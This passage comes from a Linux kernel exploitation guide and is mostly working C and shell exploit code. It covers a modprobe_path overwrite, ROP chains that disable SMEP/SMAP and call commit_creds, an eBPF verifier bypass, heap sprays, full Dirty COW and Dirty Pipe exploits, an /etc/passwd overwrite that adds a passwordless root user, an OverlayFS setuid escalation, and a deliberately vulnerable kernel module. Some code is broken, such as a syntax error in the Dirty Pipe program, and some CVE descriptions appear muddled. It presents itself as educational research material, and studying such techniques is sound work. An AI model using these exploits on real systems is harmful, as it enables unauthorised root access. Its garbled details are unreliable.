// /proc/sys/kernel/modprobe_path is a global variable containing
// the path to the modprobe binary. Overwriting it gives execution as root.
//
// Steps:
// 1. Leak or know modprobe_path address (offset from kaslr base)
// 2. Write path to attacker-controlled script
// 3. Execute an unknown binary format to trigger modprobe

#define MODPROBE_PATH 0xffffffff82xxxxxxULL  // from System.map

void exploit_modprobe(arb_write_fn write_fn) {
    // Write our script path
    write_fn(MODPROBE_PATH, (unsigned long)"/tmp/x");

    // Create /tmp/x script
    system("echo '#!/bin/sh' > /tmp/x");
    system("echo 'chmod u+s /bin/bash' >> /tmp/x");
    system("chmod +x /tmp/x");

    // Create a dummy binary with unknown format to trigger modprobe
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("/tmp/dummy");      // triggers modprobe_path execution
    system("/bin/bash -p");    // bash now has suid
}
```

### 4.3 Restricted Write Primitives

When full arbitrary write isn't available, restricted writes (e.g., single NULL byte, increment, bit flip) can still be exploited:

**NULL byte write at controlled or semi-controlled address:**

```c
// Writing a NULL byte can:
// 1. Clear a LSB of a function pointer → redirect to nearby code
// 2. Overwrite a length field to 0
// 3. Clear a permission bit

// Example: NULL byte at LSB of a function pointer
// If fp = 0xffffffff81234567 and we NULL the LSB:
// fp = 0xffffffff81234500 → jumps to a different instruction
// If there's a useful gadget at 0xffffffff81234500, we win
```

**Increment / decrement primitive:**

```c
// Incrementing a reference count causes use-after-free
// Decrementing a size field causes OOB read/write
// Flipping a sign bit changes signed to unsigned

// Example: increment cred->euid from 1000 toward 0
// Needs: address of cred->euid, and ability to increment
for (int i = 0; i < 1000; i++) {
    increment_at(cred_addr + EUID_OFFSET);
}
```

### 4.4 Stack Pivoting in Kernel

When ROP space on the kernel stack is limited, pivot the stack to an attacker-controlled area:

**Common pivot gadgets:**

```
xchg eax, esp; ret         # rsp = rax << 32 (if rax controlled), rip = [old_rsp]
mov esp, eax; ret          # if eax controlled
add rsp, 0xXXXX; ret       # skip over unwanted stack data
```

**Setting up for `xchg eax, esp; ret`:**

```c
// If we control rax and can use "xchg eax, esp; ret":
// 1. Pivot to a user-mapped address
// 2. The user address (low 32 bits of rax) becomes new stack

unsigned long pivot_gadget = XCHG_EAX_ESP_RET;  // found in vmlinux
unsigned long target_stack_addr = 0x7fff0000;   // must be mapped and RW

// Map the target
void *fake_stack = mmap((void *)target_stack_addr, 0x10000,
    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

// Place ROP chain at target_stack_addr
unsigned long *chain = (unsigned long *)target_stack_addr;
int i = 0;
chain[i++] = POP_RDI_RET;
chain[i++] = 0;
chain[i++] = PREPARE_KERNEL_CRED;
chain[i++] = MOV_RDI_RAX_RET;
chain[i++] = 0;
chain[i++] = COMMIT_CREDS;
chain[i++] = KPTI_TRAMPOLINE;
chain[i++] = 0;  // rax
chain[i++] = 0;  // rdi
chain[i++] = (unsigned long)shell;
chain[i++] = user_cs;
chain[i++] = user_rflags;
chain[i++] = user_sp;
chain[i++] = user_ss;

// Set rax to our target address (trigger must set rax)
// Then trigger: xchg eax, esp will set esp = target_stack_addr
```

### 4.5 SMEP/SMAP Bypass Strategies

**SMEP** (Supervisor Mode Execution Prevention): Prevents kernel from executing user-space code.
**SMAP** (Supervisor Mode Access Prevention): Prevents kernel from accessing user-space data.

**Bypass strategies:**

| Strategy | SMEP | SMAP | Requirement |
|----------|------|------|-------------|
| ROP chain in kernel text | Yes | N/A | Kernel text gadgets |
| `native_write_cr4` to disable | Yes | Yes | CR4 write gadget |
| Stack pivot to kernel memory | Yes | N/A | Pivot gadget + kernel R/W |
| KPTI trampoline | Yes | Yes | Known trampoline address |
| `rdmsr; wrmsr` gadgets | Yes | Yes | MSR gadgets |

**CR4 disable technique:**

```c
// CR4 bits: SMEP = bit 20, SMAP = bit 21
// native_write_cr4(value) writes to CR4
// Find native_write_cr4 in vmlinux:
//   grep "native_write_cr4" /proc/kallsyms
// Or use a gadget: mov cr4, rdi; ... ret (rare)

// ROP chain to disable SMEP/SMAP:
rop_chain[i++] = POP_RDI_RET;
rop_chain[i++] = 0x406f0;  // CR4 with SMEP+SMAP disabled (clear bits 20,21)
rop_chain[i++] = NATIVE_WRITE_CR4;  // kernel function address

// After disabling, can jump to user shellcode
rop_chain[i++] = (unsigned long)shellcode;  // now executable in kernel mode
```

**Signal handler bypass for SMAP:**

```c
// When kernel reads user memory during copy_from_user with SMAP enabled,
// an SMAP violation causes a crash. However, on older kernels, a signal
// handler can be used to redirect execution after the fault:
// 1. Register a SIGSEGV handler
// 2. The kernel fault recovers and returns to our handler
// 3. We've already achieved partial corruption

// This generally only works for non-fatal SMAP violations.
signal(SIGSEGV, (void *)shell);
```

### 4.6 KASLR Bypass Techniques

| Technique | Prerequisite | Reliability |
|-----------|-------------|-------------|
| `/proc/kallsyms` | `kptr_restrict=0` or root | High |
| `dmesg` | `dmesg_restrict=0` | Medium |
| Information leak via bug | OOB read / UAF read | High |
| Relative overwrite | Partial corruption | Low-Medium |
| Brute force | No leak available | Low (x86_64) |
| Side channels | Cache timing | Low-Medium |
| Known offset from base | Single known symbol | High |

**KASLR info leak via vulnerable module:**

```c
// Exploit an OOB read to leak a kernel pointer, then compute KASLR slide
unsigned long leak_kernel_ptr(int fd) {
    char buf[0x100];
    read(fd, buf, sizeof(buf));

    // Search for kernel pointer pattern
    unsigned long *ptrs = (unsigned long *)buf;
    for (int i = 0; i < sizeof(buf) / 8; i++) {
        if ((ptrs[i] & 0xffffffff00000000ULL) == 0xffffffff00000000ULL) {
            unsigned long leaked = ptrs[i];
            printf("[+] Leaked kernel pointer: 0x%lx\n", leaked);
            return leaked;
        }
    }
    return 0;
}

// Compute KASLR base from leaked pointer:
unsigned long compute_kaslr_base(unsigned long leaked_ptr) {
    unsigned long known_offset = 0xffffffff81000000ULL; // expected addr of leaked symbol
    unsigned long actual_offset = 0x1234567ULL;  // offset of leaked symbol from kbase
    // KASLR slide = leaked_ptr - (expected_base + actual_symbol_offset)
    return leaked_ptr - actual_offset;
}
```

### 4.7 KPTI Bypass Techniques

Kernel Page Table Isolation (KPTI) separates kernel and user page tables. When returning to userland, CR3 must be switched to user page tables.

**Primary bypass: use the KPTI trampoline** (section 1.4)

**Alternative bypasses:**

1. **Modify CR3 directly in ROP chain:**
```
pop rdi; ret          -> 0x1000  (PCID for user)
mov cr3, rdi; ret     -> switch to user page tables
swapgs; iretq
```

2. **Disable KPTI at boot:** Add `nopti` to kernel command line (requires reboot or physical access)

3. **Signal-based return:** If the exploit causes a recoverable fault, the kernel's fault handler will return to userland via the proper KPTI path

4. **Use kernel ROP only:** If the goal is kernel-mode persistence, returning to userland isn't needed

---

## 5. eBPF Exploitation

### 5.1 eBPF Verifier Bugs and Exploitation

The eBPF verifier validates BPF programs before they're loaded into the kernel. Bugs in the verifier allow loading programs that bypass safety checks, leading to out-of-bounds memory access in kernel context.

**Common verifier bug classes:**

| Bug Type | Description |
|----------|-------------|
| Bounds tracking error | Verifier miscalculates register range |
| Type confusion | Verifier treats pointer as scalar (or vice versa) |
| Uninitialized read | Verifier misses use of uninitialized stack slot |
| Precision backtracking | Incorrect pruning of verification paths |
| Map value overflow | Incorrect sizing of map access |

**Exploiting a bounds tracking bug (CVE-2022-0506 style):**

```c
#include <linux/bpf.h>
#include <sys/syscall.h>

// BPF program that exploits a verifier bounds check bypass
// This creates an out-of-bounds read primitive
struct bpf_insn prog[] = {
    // Load map value pointer
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_1, 0),  // ctx

    // Trigger bounds confusion:
    // Verifier thinks the range is [0, MAX] but it's actually unbounded
    BPF_LD_MAP_FD(BPF_REG_1, map_fd),
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_6, -4),  // store on stack
    BPF_LDX_MEM(BPF_W, BPF_REG_2, BPF_REG_10, -4),  // load it back

    // The bounds miscalculation happens here:
    // verifier: r2 has range [0, 255]
    // reality: r2 has range [0, 0xFFFFFFFF]
    BPF_ALU64_IMM(BPF_AND, BPF_REG_2, 0xff),          // mask to 8 bits
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 2),              // shift to index
    BPF_ALU64_REG(BPF_ADD, BPF_REG_2, BPF_REG_1),      // add to map ptr

    // Out-of-bounds read (verified as safe, actually OOB)
    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_2, 0),

    // Leak the value
    BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 0),

    BPF_EXIT_INSN(),
};

// Load the BPF program
int load_bpf_prog(struct bpf_insn *insns, int cnt) {
    union bpf_attr attr = {};
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insns = (unsigned long)insns;
    attr.insn_cnt = cnt;
    attr.license = (unsigned long)"GPL";
    attr.log_level = 2;
    attr.log_size = 0x10000;
    attr.log_buf = (unsigned long)calloc(1, 0x10000);

    int fd = syscall(SYS_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    if (fd < 0) {
        printf("[-] BPF load failed\n%s\n", (char *)attr.log_buf);
    } else {
        printf("[+] BPF program loaded: fd=%d\n", fd);
    }
    return fd;
}
```

**Using BPF arbitrary read for KASLR bypass:**

```c
// After achieving OOB read via BPF, read kernel memory:
// 1. Store leaked values in BPF map
// 2. Read map from userland to extract kernel pointers

void extract_bpf_leak(int map_fd) {
    unsigned long val;
    bpf_lookup_elem(map_fd, 0, &val);
    if (val >= 0xffffffff80000000ULL) {
        printf("[+] Leaked kernel address: 0x%lx\n", val);
    }
}
```

### 5.2 BPF Maps as Heap Spray Targets

BPF maps are allocated with `kmalloc` and can be used to spray the kernel heap with controlled data:

```c
// Create a BPF map with controlled value size
int create_spray_map(int value_size) {
    union bpf_attr attr = {};
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = value_size;
    attr.max_entries = 256;

    return syscall(SYS_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

// Spray: fill map entries with controlled data
void spray_bpf_map(int map_fd, unsigned long *data, int data_len) {
    union bpf_attr attr = {};
    int key;
    unsigned char value[0x400];

    memset(value, 0, sizeof(value));
    memcpy(value, data, data_len);

    for (key = 0; key < 256; key++) {
        attr.map_fd = map_fd;
        attr.key = (unsigned long)&key;
        attr.value = (unsigned long)value;
        syscall(SYS_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
    }
}

// Spray targeting specific kmalloc cache:
// kmalloc-64:  value_size = 64 - sizeof(bpf_map_entry)
// kmalloc-192: value_size = 192 - overhead
// kmalloc-1024: value_size = 1024 - overhead
```

### 5.3 Recent eBPF CVEs and Techniques

**CVE-2021-3490 (eBPF bounds tracking):**
- Verifier incorrectly computed 32-bit bounds for 64-bit operations
- Allowed out-of-bounds read/write on map values
- Fix: improved bounds tracking precision

**CVE-2022-0506 (eBPF bounds confusion):**
- `bpf_skb_{push,pull}` changes packet size but verifier didn't track it
- Allowed OOB access on packet data

**CVE-2023-2163 (eBPF pointer leak):**
- Verifier failed to properly sanitize pointer arithmetic
- Allowed leaking kernel addresses to unprivileged users

**CVE-2024-1086 (nf_tables eBPF-style UAF):**
- While not eBPF, similar exploitation pattern using netfilter
- Used nft_set_elem double-free for privilege escalation
- Demonstrated that BPF-like techniques apply to other subsystems

**General eBPF exploit strategy:**

```
1. Identify verifier bug → create program that passes verification
                          but does something unsafe at runtime
2. Achieve OOB read → leak kernel addresses (KASLR bypass)
3. Achieve OOB write → overwrite cred or function pointer
4. Trigger LPE → commit_creds(prepare_kernel_cred(0))
```

---

## 6. Notable Kernel Exploits Walkthrough

### 6.1 Dirty COW (CVE-2016-5195) — Detailed Walkthrough

**Vulnerability:** Race condition in the kernel's Copy-On-Write (COW) mechanism for memory-mapped files. `get_user_pages()` (GUP) lacked proper dirty page tracking, allowing a write to a read-only private mapping to modify the underlying file.

**Affected kernels:** Linux 2.6.38 through 4.8.3.

**Root cause analysis:**

```c
// In mm/gup.c, the COW flow:
// 1. Process mmaps a read-only file with MAP_PRIVATE
// 2. Process writes to the mapping
// 3. Kernel creates a private COW copy of the page
// 4. BUG: if another thread uses madvise(MADV_DONTNEED) on the page
//    between step 2 and the COW completion, the kernel mistakenly
//    writes to the original page (not the COW copy)

// The critical race window:
// Thread A: write fault occurs, GUP begins COW
// Thread B: madvise(MADV_DONTNEED) evicts the page
// Thread A: COW completes but reference counting is wrong,
//           allowing the write to reach the file-backed page
```

**Exploit code (simplified):**

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>

static void *map;
static int fd;
static volatile int stop;

void *madvise_thread(void *arg) {
    while (!stop) {
        madvise(map, 0x1000, MADV_DONTNEED);
        sched_yield();
    }
    return NULL;
}

void *write_thread(void *arg) {
    char *str = (char *)arg;
    while (!stop) {
        // Try to write to the read-only mapping
        // This should trigger COW, but due to the bug,
        // the write may reach the underlying file
        memcpy(map, str, strlen(str));
        sched_yield();
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <file> <content>\n", argv[0]);
        return 1;
    }

    pthread_t madvise_tid, write_tid;

    fd = open(argv[1], O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    struct stat st;
    fstat(fd, &st);

    // Map as read-only private mapping
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); return 1; }

    pthread_create(&madvise_tid, NULL, madvise_thread, NULL);
    pthread_create(&write_tid, NULL, write_thread, argv[2]);

    // Wait for write to succeed (check file content)
    for (int i = 0; i < 10000; i++) {
        char buf[256];
        lseek(fd, 0, SEEK_SET);
        read(fd, buf, sizeof(buf));
        if (strstr(buf, argv[2])) {
            printf("[+] Successfully wrote to file!\n");
            break;
        }
        usleep(1000);
    }

    stop = 1;
    pthread_join(madvise_tid, NULL);
    pthread_join(write_tid, NULL);

    close(fd);
    return 0;
}
```

**Exploitation steps:**

1. `mmap` a root-owned setuid binary (like `/usr/bin/passwd`) as `MAP_PRIVATE`
2. Race `write()` that puts shellcode into the mapping vs. `madvise(MADV_DONTNEED)` that evicts the COW page
3. When the race is won, the write propagates to the underlying file
4. Modify a setuid binary to execute a shell
5. Execute the modified setuid binary → root shell

**Mitigation patch:** Added proper `FAULT_FLAG_ALLOW_RETRY` handling and `page_lock` acquisition in `__get_user_pages()`.

### 6.2 Dirty Pipe (CVE-2022-0847) — Detailed Walkthrough

**Vulnerability:** Missing initialization of the `PIPE_BUF_FLAG_CAN_MERGE` flag in `pipe_buffer` structures, allowing unprivileged overwriting of page cache contents for read-only files.

**Affected kernels:** Linux 5.8 through 5.16.11, 5.10.101+, 5.4.181+.

**Root cause:**

```c
// In fs/pipe.c and mm/filemap.c:
// When a pipe is created, pipe_buffer structs are allocated but not fully zeroed
// The flags field may contain stale PIPE_BUF_FLAG_CAN_MERGE from a previous page
// This flag tells the kernel that subsequent writes to this pipe page should
// be merged into the existing page cache entry
//
// Exploit flow:
// 1. Create a pipe (pipe())
// 2. Fill the pipe with arbitrary data (sets PIPE_BUF_FLAG_CAN_MERGE on pages)
// 3. Drain the pipe (pages are freed BUT flags persist in kernel memory)
// 4. Splice from a read-only target file into the pipe
// 5. Write attacker data into the pipe — it merges into the page cache page!
```

**Full exploit:**

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/pipe_fs_i.h>

// Dirty Pipe exploit for CVE-2022-0847
// Overwrites read-only files via pipe buffer flag bug

#define PIPE_BUF_FLAG_CAN_MERGE  0x10
#define PAGE_SIZE 4096

int main(int argc, char *argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <file> <offset> <data>\n", argv[0]);
        return 1;
    }

    const char *target_file = argv[1];
    loff_t offset = atol(argv[2];
    const char *data = argv[3];
    size_t data_len = strlen(data);

    int fd = open(target_file, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    // Step 1: Create pipe and fill all entries
    int pfd[2];
    pipe(pfd);

    // Fill the pipe to set PIPE_BUF_FLAG_CAN_MERGE on all pages
    // We need to fill all PIPE_DEF_BUFS (usually 16) pages
    char buf[PAGE_SIZE];
    memset(buf, 'A', sizeof(buf));

    for (int i = 0; i < 16; i++) {
        write(pfd[1], buf, PAGE_SIZE);
    }

    // Step 2: Drain the pipe (release pages but keep flags)
    for (int i = 0; i < 16; i++) {
        read(pfd[0], buf, PAGE_SIZE);
    }

    // Step 3: Splice data from target file into pipe
    // This associates the target file's page cache with the pipe buffer
    // The bug: PIPE_BUF_FLAG_CAN_MERGE is still set!
    ssize_t n_splice = splice(fd, &offset, pfd[1], NULL, data_len, 0);
    if (n_splice < 0) {
        perror("splice");
        return 1;
    }
    // Note: offset must be page-aligned for the splice to reuse the same page

    // Step 4: Write attacker data into the pipe
    // Because PIPE_BUF_FLAG_CAN_MERGE is set, the data is written
    // into the page cache page, NOT a new anonymous page
    write(pfd[1], data, data_len);

    close(pfd[0]);
    close(pfd[1]);
    close(fd);

    printf("[+] Successfully wrote %zu bytes to %s at offset %ld\n",
           data_len, target_file, offset);
    return 0;
}
```

**Privilege escalation technique:**

```bash
# Write to /etc/passwd to add root user
# First, create data that overwrites a line in /etc/passwd
echo 'root2::0:0::/root:/bin/sh' > /tmp/data

# Run the exploit to overwrite /etc/passwd
./dirty_pipe /etc/passwd 0 "$(printf 'root2::0:0::/root:/bin/sh\n')"

# Now log in as root2 (no password)
su root2
```

**Alternative LPE via overwriting crontab or setuid binary:**

```
# Overwrite a setuid binary with a shell
# Actually easier: overwrite /etc/cron.d/ files
./dirty_pipe /etc/passwd <offset> "root2::0:0::/root:/bin/bash\n"
```

**Mitigation patch (kernel 5.16.11):**

```c
// In copy_page_to_iter_pipe() and push_pipe():
// Added explicit flag clearing:
pipe->bufs[head].flags = 0;  // Clear ALL flags, including CAN_MERGE
```

### 6.3 OverlayFS Exploits

**CVE-2023-0386 (OverlayFS setuid copy-up):**

When a file with setuid bits is copied up from the lower layer to the upper layer, OverlayFS failed to clear the setuid bit during the copy-up operation.

```c
// Exploit:
// 1. Create lower layer with setuid binary
// 2. Mount overlay with lower layer
// 3. Execute the setuid binary through overlay
// 4. The binary is copied up with setuid bit preserved
// 5. Move the upper layer copy elsewhere
// 6. Repeat to create a setuid shell

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>

int main() {
    // Setup overlayfs directories
    system("mkdir -p /tmp/ovl/{lower,upper,work,mnt}");
    system("cp /bin/sh /tmp/ovl/lower/shell");
    system("chmod u+s /tmp/ovl/lower/shell");

    // Mount overlayfs (requires user namespace or CAP_SYS_ADMIN)
    mount("overlay", "/tmp/ovl/mnt", "overlay",
          MS_NOATIME,
          "lowerdir=/tmp/ovl/lower,upperdir=/tmp/ovl/upper,workdir=/tmp/ovl/work");

    // Execute setuid shell through overlay — triggers copy-up
    // After copy-up, the setuid bit is incorrectly preserved
    system("/tmp/ovl/mnt/shell -p");

    return 0;
}
```

**CVE-2021-4032 (OverlayFS permission bypass):**

OverlayFS did not properly validate file capabilities during copy-up, allowing local privilege escalation.

### 6.4 io_uring Vulnerabilities

**io_uring** is a high-performance async I/O interface in Linux. Its complexity has led to numerous vulnerabilities.

**CVE-2022-29582 (io_uring UAF):**

Race condition between io_uring task work and ring cleanup, leading to a UAF on the `io_uring` context.

```c
// Exploitation outline:
// 1. Create an io_uring instance
// 2. Submit I/O requests that register task work
// 3. Trigger ring close while task work is pending
// 4. The pending task work references freed io_uring memory
// 5. Reclaim with controlled object (heap spray using msg_msg or pipe_buffer)
// 6. Corrupt function pointers to gain ROP / code execution
```

**CVE-2024-0582 (io_uring io_uring_cmd UAF):**

```c
// Simplified exploit flow for io_uring_cmd UAF:
// 
// 1. Open a device that supports io_uring_cmd (e.g., NVMe ioctl)
// 2. Submit an io_uring_cmd operation
// 3. Queue a SQE with IOSQE_IO_HARDLINKING to create a linked sequence
// 4. Cancel the first request — causes it to be freed
// 5. The linked request still references the freed io_kiocb
// 6. Reclaim with msg_msg or setxattr buffer
// 7. Trigger execution via the linked request → controlled RIP

#include <liburing.h>

void io_uring_uaf_exploit(void) {
    struct io_uring ring;
    io_uring_queue_init(32, &ring, 0);

    // Submit linked SQEs
    struct io_uring_sqe *sqe;
    
    // First: an io_uring_cmd operation
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_cmd(sqe, 0, ...);  // NVMe passthrough
    sqe->flags |= IOSQE_IO_HARDLINK;

    // Second: a NOP that will reference the first
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_nop(sqe);

    io_uring_submit(&ring);

    // Cancel the first request
    // io_uring_prep_cancel
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_cancel(sqe, first_user_data, 0);
    io_uring_submit(&ring);

    // Spray to reclaim freed io_kiocb
    spray_with_controlled_data();

    // Trigger second request which uses freed memory
    io_uring_wait_cqe(&ring, &cqe);
    // Now we have code execution

    io_uring_queue_exit(&ring);
}
```

**io_uring exploit primitives summary:**

| CVE | Type | Primitive | LPE Method |
|-----|------|-----------|------------|
| CVE-2021-41073 | UAF | io_kiocb UAF | Function pointer overwrite |
| CVE-2022-29582 | Race | task_work UAF | ROP / cred overwrite |
| CVE-2023-2598 | OOB | overflow in io_msg | Stack corruption |
| CVE-2024-0582 | UAF | io_uring_cmd UAF | msg_msg spray → RIP control |

---

## Appendix A: Kernel Module Practice Target

The following kernel module is designed as a practice target for developing exploitation skills:

```c
// vuln_module.c — Intentionally vulnerable kernel module for practice
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#define CMD_BUFFER_OVERFLOW  0x13370001
#define CMD_UAF_ALLOC        0x13370002
#define CMD_UAF_USE          0x13370003
#define CMD_UAF_FREE          0x13370004
#define CMD_OOB_READ          0x13370005
#define CMD_DOUBLE_FREE       0x13370006

static char *uaf_buf;
static size_t uaf_size;
static DEFINE_MUTEX(dev_mutex);

static long vuln_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    long ret = 0;

    switch (cmd) {
    case CMD_BUFFER_OVERFLOW: {
        // Stack buffer overflow — no bounds check on copy_from_user
        char stack_buf[64];
        if (copy_from_user(stack_buf, (void __user *)arg, 0x1000)) {
            ret = -EFAULT;
            break;
        }
        // If arg data > 64 bytes, we overflow stack_buf → RIP control
        break;
    }
    case CMD_UAF_ALLOC: {
        // Allocate a heap buffer and copy user data into it
        uaf_size = 64;
        uaf_buf = kmalloc(uaf_size, GFP_KERNEL);
        if (!uaf_buf) {
            ret = -ENOMEM;
            break;
        }
        if (copy_from_user(uaf_buf, (void __user *)arg, uaf_size)) {
            kfree(uaf_buf);
            ret = -EFAULT;
            break;
        }
        break;
    }
    case CMD_UAF_USE: {
        // Use the buffer — but it might have been freed
        if (!uaf_buf) {
            ret = -EINVAL;
            break;
        }
        // Copy UAF buffer contents to user — info leak
        if (copy_to_user((void __user *)arg, uaf_buf, uaf_size)) {
            ret = -EFAULT;
            break;
        }
        break;
    }
    case CMD_UAF_FREE: {
        // Free the buffer — but don't NULL the pointer (UAF)
        if (uaf_buf) {
            kfree(uaf_buf);
            // BUG: uaf_buf is NOT set to NULL — use-after-free possible
        }
        break;
    }
    case CMD_OOB_READ: {
        // Out-of-bounds read from allocated buffer
        char *oob_buf = kmalloc(64, GFP_KERNEL);
        if (!oob_buf) {
            ret = -ENOMEM;
            break;
        }
        // Copy MORE than allocated — reads adjacent heap data
        if (copy_to_user((void __user *)arg, oob_buf, 0x100)) {
            kfree(oob_buf);
            ret = -EFAULT;
            break;
        }
        kfree(oob_buf);
        break;
    }
    case CMD_DOUBLE_FREE: {
        // Double free vulnerability
        char *df_buf = kmalloc(64, GFP_KERNEL);
        if (!df_buf) {
            ret = -ENOMEM;
            break;
        }
        kfree(df_buf);
        // BUG: freeing the same pointer again
        kfree(df_buf);
        break;
    }
    default:
        ret = -ENOTTY;
    }
    return ret;
}

static const struct file_operations vuln_fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = vuln_ioctl,
};

static struct miscdevice vuln_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "vuln",
    .fops = &vuln_fops,
};

static int __init vuln_init(void) {
    int ret = misc_register(&vuln_device);
    if (ret) {
        pr_err("Failed to register device\n");
        return ret;
    }
    pr_info("vuln module loaded — DO NOT USE IN PRODUCTION\n");
    return 0;
}

static void __exit vuln_exit(void) {
    misc_deregister(&vuln_device);
    pr_info("vuln module unloaded\n");
}

module_init(vuln_init);
module_exit(vuln_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Intentionally vulnerable kernel module for practice");
```

**Makefile for the module:**

```makefile
obj-m += vuln_module.o

KDIR := /lib/modules/$(shell uname -r)/build

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean
```

---

## Appendix B: Quick Reference — Exploitation Checklist

```
[ ] 1. Identify vulnerability class (UAF, OOB, race, etc.)
[ ] 2. Determine heap cache (kmalloc-64, kmalloc-192, etc.)
[ ] 3. Choose spray target (msg_msg, pipe_buffer, setxattr, etc.)
[ ] 4. Bypass KASLR (info leak from OOB read or known symbol)
[ ] 5. Build ROP chain or function pointer overwrite
[ ] 6. Disable SMEP/SMAP if needed (CR4 write or ROP-only)
[ ] 7. Escalate privileges (commit_creds or cred overwrite)
[ ] 8. Return to userland (KPTI trampoline or swapgs + iretq)
[ ] 9. Verify with id && cat /etc/shadow
[ ] 10. Clean up (restore corrupted structures if possible)
```

**Common spray object sizes and uses:**

| Object | kmalloc cache | Useful fields |
|--------|---------------|---------------|
| `msg_msg` (header) | kmalloc-64 | `m_list`, `m_type`, `m_ts` |
| `msg_msg` (segment) | kmalloc-1k to 4k | user data → controlled content |
| `pipe_buffer` | kmalloc-1k | `ops` pointer (vtable) |
| `setxattr` buffer | any (1 to 64K) | fully controlled content |
| `sk_buff` | kmalloc-1k+ | function pointers |
| `tty_struct` | kmalloc-2k | `ops` pointer (tty_operations) |
| `subprocess_info` | kmalloc-256 | `path`, `work.func` |
| `io_uring` buffers | various | function pointers |

---

*This document is for authorized security research and educational purposes only. Always ensure you have proper authorization before testing exploitation techniques on any system.*